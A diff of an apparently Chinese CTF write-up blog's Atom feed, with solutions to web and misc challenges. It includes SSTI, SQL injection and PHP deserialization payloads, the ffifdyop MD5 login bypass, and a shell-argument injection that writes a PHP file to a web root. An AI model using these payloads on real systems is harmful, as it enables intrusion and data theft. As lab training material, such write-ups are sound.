@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Ro1ing.github.io</id>
     <title>Ro1ing</title>
-    <updated>2021-01-30T06:26:24.041Z</updated>
+    <updated>2021-01-30T06:49:53.763Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Ro1ing.github.io"/>
     <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
@@ -11,779 +11,597 @@
     <icon>https://Ro1ing.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Ro1ing</rights>
     <entry>
-        <title type="html"><![CDATA[[WesternCTF2018]shrine]]></title>
-        <id>https://Ro1ing.github.io/post/westernctf2018shrine/</id>
-        <link href="https://Ro1ing.github.io/post/westernctf2018shrine/">
+        <title type="html"><![CDATA[[ALCTF]Misc]]></title>
+        <id>https://Ro1ing.github.io/post/alctfmisc/</id>
+        <link href="https://Ro1ing.github.io/post/alctfmisc/">
         </link>
-        <updated>2021-01-30T06:24:00.000Z</updated>
-        <summary type="html"><![CDATA[<pre><code class="language-python">import flask
-import os
-app = flask.Flask(__name__)
-app.config['FLAG'] = os.environ.pop('FLAG')
-@app.route('/')
-def index():
-    return open(__file__).read()
-@app.route('/shrine/&lt;path:shrine&gt;')
-def shrine(shrine):
-def safe_jinja(s):
-        s = s.replace('(', '').replace(')', '')
-        blacklist = ['config', 'self']
-        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
-return flask.render_template_string(safe_jinja(shrine))
-if __name__ == '__main__':
-    app.run(debug=True)
-</code></pre>
-<p>题目出现这个</p>
-<p><strong>flask引擎-jinja2模板注入</strong></p>
-<p>利用tplmap这个工具进行检测是否有模板注入漏洞</p>
-<pre><code>python tplmap.py -u 
-</code></pre>
-<p><img src="" alt="" loading="lazy"><img src="https://Ro1ing.github.io/post-images/1611987920309.png" alt="" loading="lazy"></p>
-<blockquote>
-<p>Automatic Server-Side Template Injection Detection and Expleion tool [checks] Tested parameters appear to be not injectable<br>
-翻译：<br>
-服务器端模板自动注入检测和删除离子工具！][检查经过测试的参数似乎无法注入</p>
-</blockquote>
-<p><strong>模板渲染接受的参数需要用两个大括号括起来{ { } }</strong></p>
-<p>模板注入也在大括号里构造</p>
-<p><img src="https://Ro1ing.github.io/post-images/1611987954881.png" alt="" loading="lazy"><br>
-在shrine路径下 ssti注入能运行</p>
-<p>回头看下源码</p>
-<pre><code>app.config['FLAG'] = os.environ.pop('FLAG')
-</code></pre>
-<p>注册了一个名为FLAG的config，猜测这就是flag，</p>
-<p><strong>如果没有过滤可以直接{{config}}即可查看所有app.config内容</strong></p>
-<p>推测{{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p>
-<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
-<blockquote>
-<p>/shrine/{{url_for.<strong>globals</strong>}}</p>
-</blockquote>
-<p><img src="3.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987966420.png" alt="" loading="lazy"><br>
-current_app-当前app，查看当下app中的config</p>
-<p><img src="4.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987971566.png" alt="" loading="lazy"><br>
-得到flag</p>
-<p>知识点：</p>
-<p><strong>SSTI模板注入：</strong></p>
-<p><img src="5.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987976487.png" alt="" loading="lazy"><br>
-模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
-<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
-<p>引擎有不同的测试以及注入方式！</p>
-]]></summary>
-        <content type="html"><![CDATA[<pre><code class="language-python">import flask
-import os
-app = flask.Flask(__name__)
-app.config['FLAG'] = os.environ.pop('FLAG')
-@app.route('/')
-def index():
-    return open(__file__).read()
-@app.route('/shrine/&lt;path:shrine&gt;')
-def shrine(shrine):
-def safe_jinja(s):
-        s = s.replace('(', '').replace(')', '')
-        blacklist = ['config', 'self']
-        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
-return flask.render_template_string(safe_jinja(shrine))
-if __name__ == '__main__':
-    app.run(debug=True)
-</code></pre>
-<p>题目出现这个</p>
-<p><strong>flask引擎-jinja2模板注入</strong></p>
-<p>利用tplmap这个工具进行检测是否有模板注入漏洞</p>
-<pre><code>python tplmap.py -u 
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1611987920309.png" alt="" loading="lazy"></figure>
-<blockquote>
-<p>Automatic Server-Side Template Injection Detection and Expleion tool [checks] Tested parameters appear to be not injectable<br>
-翻译：<br>
-服务器端模板自动注入检测和删除离子工具！][检查经过测试的参数似乎无法注入</p>
-</blockquote>
-<p><strong>模板渲染接受的参数需要用两个大括号括起来{ { } }</strong></p>
-<p>模板注入也在大括号里构造</p>
-<p><img src="https://Ro1ing.github.io/post-images/1611987954881.png" alt="" loading="lazy"><br>
-在shrine路径下 ssti注入能运行</p>
-<p>回头看下源码</p>
-<pre><code>app.config['FLAG'] = os.environ.pop('FLAG')
-</code></pre>
-<p>注册了一个名为FLAG的config，猜测这就是flag，</p>
-<p><strong>如果没有过滤可以直接{{config}}即可查看所有app.config内容</strong></p>
-<p>推测{{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号</p>
-<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
-<blockquote>
-<p>/shrine/{{url_for.<strong>globals</strong>}}</p>
-</blockquote>
-<p><img src="3.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987966420.png" alt="" loading="lazy"><br>
-current_app-当前app，查看当下app中的config</p>
-<p><img src="4.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987971566.png" alt="" loading="lazy"><br>
-得到flag</p>
-<p>知识点：</p>
-<p><strong>SSTI模板注入：</strong></p>
-<p><img src="5.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611987976487.png" alt="" loading="lazy"><br>
-模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
-<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
-<p>引擎有不同的测试以及注入方式！</p>
-<!-- more -->
-<blockquote>
-<p><strong>flask/jinja2模板注入</strong></p>
-<p><strong>PHP/模版引擎Twig注入</strong></p>
-</blockquote>
+        <updated>2021-01-30T06:46:30.000Z</updated>
+        <content type="html"><![CDATA[<p>校内CTF平台 题目</p>
+<h2 id="只会影响我拔剑的速度">只会影响我拔剑的速度</h2>
+<p>gif逐帧播放</p>
+<h2 id="听我娓娓道来">听我娓娓道来</h2>
+<p>属性-详细信息-备注 or 16进制</p>
+<p>与佛论禅解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx</p>
+<h2 id="电线鲨鱼">电线鲨鱼</h2>
+<p>wireshark打开流量包</p>
+<p><img src="1.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989239604.png" alt="" loading="lazy"><br>
+or 偷鸡 16进制</p>
+<p><img src="2.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989243485.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[护网杯2018]easy_tornado]]></title>
-        <id>https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/</id>
-        <link href="https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/">
+        <title type="html"><![CDATA[[ASIS 2019]Unicorn shop]]></title>
+        <id>https://Ro1ing.github.io/post/asis-2019unicorn-shop/</id>
+        <link href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
         </link>
-        <updated>2021-01-30T06:21:08.000Z</updated>
-        <content type="html"><![CDATA[<p>都打开看看</p>
+        <updated>2021-01-30T06:45:22.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="image-20200519215130151.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989154422.png" alt="" loading="lazy"><br>
+发现这里无论输入任何ID和Price都无法购买</p>
+<p>当Price 小于10 时 显示Wrong commodity</p>
+<p>当Price 大于10 时 显示Only one char（？） allowed！</p>
+<p><img src="image-20200519215322998.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989157234.png" alt="" loading="lazy"><br>
+utf8?</p>
+<p>https://xz.aliyun.com/t/5402#toc-0</p>
 <blockquote>
-<p>/flag. txt<br>
-flag in/flllllllag</p>
+<h3 id="23-数字显示">2.3 数字显示</h3>
+<p>一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 <a href="https://xz.aliyun.com/t/(https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis)">Unicorn Shop</a> 也是从Unicode背后的数字角度出发考虑问题。</p>
 </blockquote>
-<blockquote>
-<p>/welcome. txt<br>
-render</p>
-</blockquote>
-<blockquote>
-<p>/hints. txt<br>
-md5(cookie_secret+md5(filename) )</p>
-</blockquote>
-<p><strong>render()函数详解</strong></p>
-<blockquote>
-<p>1.<strong>render方法的实质就是生成 itemplate模板</strong><br>
-2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的<br>
-3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容<br>
-4.通过这三个参数，可以生成一个完整的木模板</p>
-<p>tips：</p>
-<blockquote>
-<p>1、render方法可以使用SX语法，但需要 Babel plugin插件<br>
-2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可</p>
-</blockquote>
-</blockquote>
-<p>通过这种方式在网页上显示</p>
-<p><strong>render 标志着模板注入</strong></p>
-<blockquote>
-<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
-</blockquote>
-<p>测试一下</p>
-<blockquote>
-<p>/error?msg={ {1*2} }</p>
-</blockquote>
-<p>经过测试发现过滤</p>
-<p>payload:</p>
-<blockquote>
-<p>/error?msg={ {handler.settings} }</p>
-</blockquote>
-<p>cookie_secret 是handler.application.settings 的 <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">键值</a><br>
-拿到 cookie_secret 解密</p>
-<pre><code class="language-python">import hashlib
-hash = hashlib.md5()
-
-filename='/fllllllllllllag'
-cookie_secret=&quot;8b1de274-3078-4412-a8c4-a6835eeda4a1&quot;
-hash.update(filename.encode('utf-8'))
-s1=hash.hexdigest()
-hash = hashlib.md5()
-hash.update((cookie_secret+s1).encode('utf-8'))
-print(hash.hexdigest())
-</code></pre>
-<p>得到flag</p>
-<p><strong>拓展</strong>:</p>
-<pre><code class="language-python">#生成 Tornado 所需的 cookie_secret 的办法
-import base64
-import uuid
-base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes)
-</code></pre>
+<p>在这个网站查找Unicode</p>
+<p>https://www.compart.com/en/unicode</p>
+<p><img src="image-20200519215746992.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989163598.png" alt="" loading="lazy"><br>
+点开找到大于1337的字符即可</p>
+<p>参考链接：</p>
+<p>https://www.cnblogs.com/Cl0ud/p/12221360.html</p>
+<p>https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[极客大挑战 2019]LoveSQL]]></title>
-        <id>https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/</id>
-        <link href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">
+        <title type="html"><![CDATA[[BJDCTF 2nd]EasyBaBa]]></title>
+        <id>https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</id>
+        <link href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">
         </link>
-        <updated>2021-01-30T06:20:14.000Z</updated>
-        <content type="html"><![CDATA[<p>用户登录界面</p>
-<blockquote>
-<p>尝试使用万能密码</p>
-<pre><code>admin/1'or'1'='1
-</code></pre>
-</blockquote>
-<p>测试单引号' 观察是否有报错信息<br>
-这里我就可以知道为 <strong>字符型注入</strong><br>
-如果是<strong>整形</strong> 报错信息为“12’”<br>
-所以我们要使用到闭合语句来完成</p>
-<p>字符型和数字型最大的一个区别在于，数字型<u>不需要单引号来闭合</u>，而字符串<u>一般需要通过单引号来闭合的</u>。</p>
-<p>这里使用 <strong>%23</strong> 来闭合</p>
-<blockquote>
-<p>不知道这里为什么 <u>#</u>  <em>--+</em> 不行</p>
-</blockquote>
-<p>payload：</p>
-<blockquote>
-<p>?username=1&amp;password=12' %23<br>
-没有报错有回显 NO</p>
-</blockquote>
-<p>尝试联合注入</p>
-<blockquote>
-<p>?username=1&amp;password=12' union select 1%23<br>
-回显<br>
-The used sELECT statements have a different number of columns<br>
-提示了我们后面有更多的列数</p>
-</blockquote>
-<p>添加更多的列</p>
-<blockquote>
-<p>?username=1&amp;password=12' union select 1,2,3%23</p>
-</blockquote>
-<p>查询当前数据库名字</p>
-<blockquote>
-<p>?username=1&amp;password=12' union select 1,database(),3%23</p>
-</blockquote>
-<p>发现库名geek<br>
-在2字段使用group_concat()无效<br>
-查询一下3字段</p>
-<blockquote>
-<p>?username=1&amp;password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23</p>
-</blockquote>
-<p>看到<u>geek</u>里面有两个表 再查列</p>
-<blockquote>
-<p>?username=1&amp;password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23<br>
-?username=1&amp;password=12' union select 1, 2,<br>
-group_concat(password) from lovelysq1 %23</p>
-</blockquote>
-<p>得到flag<br>
-知识点:<br>
-<strong>字符型注入</strong><br>
-字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+        <updated>2021-01-30T06:44:31.000Z</updated>
+        <content type="html"><![CDATA[<p>感觉 有东西压缩在里面 foremost分离</p>
+<p>解压出一个 里面都是出题人.jpg</p>
+<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[ [ZJCTF 2019]NiZhuanSiWei]]></title>
-        <id>https://Ro1ing.github.io/post/buuctf-web/</id>
-        <link href="https://Ro1ing.github.io/post/buuctf-web/">
+        <title type="html"><![CDATA[[BJDCTF2020]Easy MD5]]></title>
+        <id>https://Ro1ing.github.io/post/bjdctf2020easy-md5/</id>
+        <link href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
         </link>
-        <updated>2021-01-30T06:10:35.000Z</updated>
-        <content type="html"><![CDATA[<p>代码审计<br>
-查看一下useless.php --只有注释信息 没有用<br>
-利用data协议绕过<br>
-将welcome to the zjctf写入<br>
-而data://协议允许读入<br>
-payload：</p>
+        <updated>2021-01-30T06:43:16.000Z</updated>
+        <content type="html"><![CDATA[<p>抓包发现 Hint</p>
 <blockquote>
-<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
+<p>select * from 'admin' where password=md5($pass,true)</p>
 </blockquote>
-<p>到这里就不会了 只有看下wp了</p>
-<p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p>
-<p>利用filter来进行读取指定文件</p>
-<p>payload：</p>
+<p>直接提交 <strong>ffifdyop</strong></p>
+<p><strong>md5()函数</strong>有两个参数</p>
+<p><strong>参数一</strong>是要加密的字符串；</p>
+<p><strong>参数二</strong>是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p>
+<p>所以要通过注入</p>
+<p>如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过</p>
+<p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c</p>
+<p>而这个字符串的前几位是 ‘or' 6</p>
+<p>Mysql 刚好又会吧 hex 转成 ascii 解释，</p>
+<p>因此拼接之后的形式是</p>
 <blockquote>
-<p>file=php://filter/read=convert.base64-encode/resource=useless.php</p>
+<p>1select * from 'admin' where password='' or '6xxxxx'</p>
 </blockquote>
-<p>得到 base64解码</p>
-<pre><code class="language-php">&lt;?php  
-
-class Flag{  //flag.php  
-    public $file;  
-    public function __tostring(){  
-        if(isset($this-&gt;file)){  
-            echo file_get_contents($this-&gt;file); 
-            echo &quot;&lt;br&gt;&quot;;
-        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
-        }  
-    }  
-}  
-?&gt;  
-</code></pre>
-<p>将flag调用，然后给里面file值赋值为flag.php。<br>
-序列化后传入password，应该就会出flag。</p>
-<blockquote>
-<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
-</blockquote>
-<p>三者结合</p>
-<p>payload：</p>
-<blockquote>
-<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
-</blockquote>
-<p>得到flag</p>
-<p>知识点：</p>
-<p><strong>序列号与反序列化</strong>知识：</p>
-<p>https://www.jianshu.com/p/631606cc5b76</p>
-<p>https://www.cnblogs.com/20175211lyz/p/11403397.html</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">类型</th>
-<th style="text-align:center">结构结构</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">String(字符串)</td>
-<td style="text-align:center">s:size:value;</td>
-</tr>
-<tr>
-<td style="text-align:center">Integer(整型)</td>
-<td style="text-align:center">i:value;</td>
-</tr>
-<tr>
-<td style="text-align:center">Boolean(布尔型)</td>
-<td style="text-align:center">b:value;(保存1或0)</td>
-</tr>
-<tr>
-<td style="text-align:center">Null</td>
-<td style="text-align:center">N;</td>
-</tr>
-<tr>
-<td style="text-align:center">Array(列)</td>
-<td style="text-align:center">a:size:{key definition;value definition;(repeated per element)}</td>
-</tr>
-<tr>
-<td style="text-align:center">Object</td>
-<td style="text-align:center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td>
-</tr>
-</tbody>
-</table>
-<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
-<p>例如这里，O代表对象，4为对象长度，1代表有一个成员变量。</p>
+<p><img src="image-20200519221047710.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989034103.png" alt="" loading="lazy"><br>
+查看源代码</p>
+<p><img src="image-20200519221054813.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989037550.png" alt="" loading="lazy"><br>
+?a=s155964671a&amp;b=s1091221200a</p>
+<p>md5碰撞：<strong>md5码不同但是表示的数字可能相同</strong>，故有md5碰撞导致可能会有安全问题</p>
+<p><img src="image-20200519221132965.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611989042033.png" alt="" loading="lazy"><br>
+后来看发现这一步不用这么复杂</p>
+<p>数组绕过：</p>
+<p>?a[]=1&amp;b[]=2即可</p>
+<p>拓展：</p>
+<p>’ffifdyop：’129581926211651571912466741651878684928’<br>
+ffifdyop：T0Do#’<strong>or’8</strong><br>
+129581926211651571912466741651878684928：<strong>’or’6</strong>]!r,b</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[静态网站和动态网站的区别]]></title>
-        <id>https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/</id>
-        <link href="https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/">
+        <title type="html"><![CDATA[[BJDCTF2020]杂项Misc]]></title>
+        <id>https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/</id>
+        <link href="https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/">
         </link>
-        <updated>2021-01-30T06:06:27.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>静态网站</strong>：没有进行数据交互的网页，不支持数据传输，页面后缀一般是“.html”。</p>
+        <updated>2021-01-30T06:42:12.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="认真你就输了">认真你就输了</h2>
+<p>xls文件打开乱码 看下文件类型</p>
+<p>16进制下发现时 压缩包</p>
+<p>每个都看看</p>
+<p><img src="%E8%AE%A4%E7%9C%9F%E4%BD%A0%E5%B0%B1%E8%BE%93%E4%BA%86.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988979124.png" alt="" loading="lazy"></p>
+<h2 id="一叶障目">一叶障目</h2>
+<p><img src="%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988982398.png" alt="" loading="lazy"></p>
+<pre><code class="language-python">import zlib
+import struct
+#读文件
+file = '1.png'  #注意，1.png图片要和脚本在同一个文件夹下哦~
+fr = open(file,'rb').read()
+data = bytearray(fr[12:29])
+crc32key = eval(str(fr[29:33]).replace('\\x','').replace(&quot;b'&quot;,'0x').replace(&quot;'&quot;,''))
+#crc32key = 0xCBD6DF8A #补上0x，copy hex value
+#data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00')  #hex下copy grep hex
+n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了
+for w in range(n):#高和宽一起爆破
+    width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节
+    for h in range(n):
+        height = bytearray(struct.pack('&gt;i', h))
+        for x in range(4):
+            data[x+4] = width[x]
+            data[x+8] = height[x]
+            #print(data)
+        crc32result = zlib.crc32(data)
+        if crc32result == crc32key:
+            print(width,height)
+            #写文件
+            newpic = bytearray(fr)
+            for x in range(4):
+                newpic[x+16] = width[x]
+                newpic[x+20] = height[x]
+            fw = open(file+'.png','wb')#保存副本
+            fw.write(newpic)
+            fw.close
+</code></pre>
+<p>crc修复脚本</p>
+<h2 id="藏藏藏">藏藏藏</h2>
+<p>binwalk分离 解压出word文档</p>
+<p>文档里有个qr码 扫描得到</p>
+<h2 id="你猜我是个啥">你猜我是个啥</h2>
+<p>查看文件头 png</p>
+<p>图片二维码 扫出来不是</p>
+<p><img src="%E4%BD%A0%E7%8C%9C%E6%88%91%E6%98%AF%E4%B8%AA%E5%95%A5.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988990340.png" alt="" loading="lazy"><br>
+佛了</p>
+<h2 id="鸡你太美">鸡你太美</h2>
+<p>在副本添加文件头</p>
+<p><img src="%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988993121.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[BUUCTF 2018]Online Tool]]></title>
+        <id>https://Ro1ing.github.io/post/buuctf-2018online-tool/</id>
+        <link href="https://Ro1ing.github.io/post/buuctf-2018online-tool/">
+        </link>
+        <updated>2021-01-30T06:41:39.000Z</updated>
+        <content type="html"><![CDATA[<p>代码审计php</p>
+<p><strong>escapeshellarg和escapeshellcmd使用不当导致rce</strong></p>
+<p>两个函数配合使用就会导致多个参数的注入。</p>
 <blockquote>
-<p>静态网站是最初的建站方式，浏览者所看到的每个页面是建站者上传到服务器上的一个 html （ htm ）文件，这种网站每增加、删除、修改一个页面，都必须重新对服务器的文件进行一次下载上传。网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件；<br>
-静态网页的内容相对稳定，因此容易被搜索引擎检索；<br>
-静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难；静态网页的交互性较差，在功能方面有较大的限制。</p>
+<p>escapeshellarg和escapeshellcmd的功能</p>
+<p><strong>escapeshellarg</strong></p>
+<p>1.确保用户只传递一个参数给命令<br>
+2.用户不能指定更多的参数一个<br>
+3.用户不能执行不同的命令</p>
+<p><strong>escapeshellcmd</strong></p>
+<p>1.确保用户只执行一个命令<br>
+2.用户可以指定不限数量的参数<br>
+3.用户不能执行不同的命令</p>
 </blockquote>
-<p><strong>动态网站</strong>：支持数据交互的网站</p>
+<p>关于escapeshellarg和escapeshellcmd使用不当导致rce</p>
+<p>在https://paper.seebug.org/164/有详解</p>
+<p>我们在这摘取</p>
+<blockquote>
 <ol>
-<li>交互性：网页会根据用户的要求和选择而动态地改变和响应，浏览器作为客户端，成为一个动态交流的桥梁，动态网页的交互性也是今后 Web 发展的潮流。</li>
-<li>自动更新：即无须手动更新 HTML 文档，便会自动生成新页面，可以大大节省工作量。</li>
-<li>因时因人而变：即当不同时间、不同用户访问同一网址时会出现不同页面。</li>
+<li>传入的参数是：172.17.0.2' -v -d a=1</li>
+<li>经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过escapeshellcmd处理后变成'172.17.0.2'\'' -v -d a=1'，这是因为escapeshellcmd对\以及最后那个<strong>不配对儿</strong>的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</li>
+<li>最后执行的命令是curl '172.17.0.2'\'' -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。</li>
 </ol>
-<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1611986854582.png" alt="" loading="lazy"></figure>
-<p>最常见的网站是PHP和Java语言做的网站了，PHP开发速度快于Java，PHP能够快速的搭建环境，以及编辑一个页面。</p>
-<p>静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画，FLASH动画，滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm，html，shtml等为后缀。</p>
-<p><em>注意HTML是标记语言而非编程语言</em></p>
-<ul>
-<li><strong>关于标记语言与编程语言</strong></li>
-</ul>
-<blockquote>
-<p>标记语言，是一种将文本（Text）以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括例如文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记（markup）进行标识。<br>
-编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成 为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些，标记语言不用于向计算机发出指令，常用于格式化和链接。<br>
-编译型语言写的程序执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如exe文件，以后要运行的话就不用重新翻译了，直接使用编译的结果就行了（exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。<br>
-两者最简单的区别在于，编程语言有逻辑和行为能力，而标记语言没有。<br>
-静态网站的安全性是要比动态网站更高的，因为静态网站本身没有与服务器的数据交互。</p>
+<p>回到mail中，我们的 payload 最终在执行时变成了'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。</p>
+<p>使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。</p>
+<p>但是我们仍然可以将参数传递给第一个命令。</p>
+<p>这意味着我们也可以将新选项传递给命令。</p>
+<p>利用漏洞的能力取决于目标可执行文件。</p>
 </blockquote>
-<p>动态网站并不是指具有动画功能的网站，而是指网站内容可根据不用情况动态变更的网站，一般情况下动态网站通过数据库进行架构，动态网站除了要设计网页外，还要童工数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是以HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站，动态是相对于静态而言。由动态的脚本编写，需要后台数据库支持。</p>
-<ul>
-<li><strong>静态与动态的区别</strong></li>
-</ul>
+<pre><code class="language-php">&lt;?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+}&gt; 
+</code></pre>
 <blockquote>
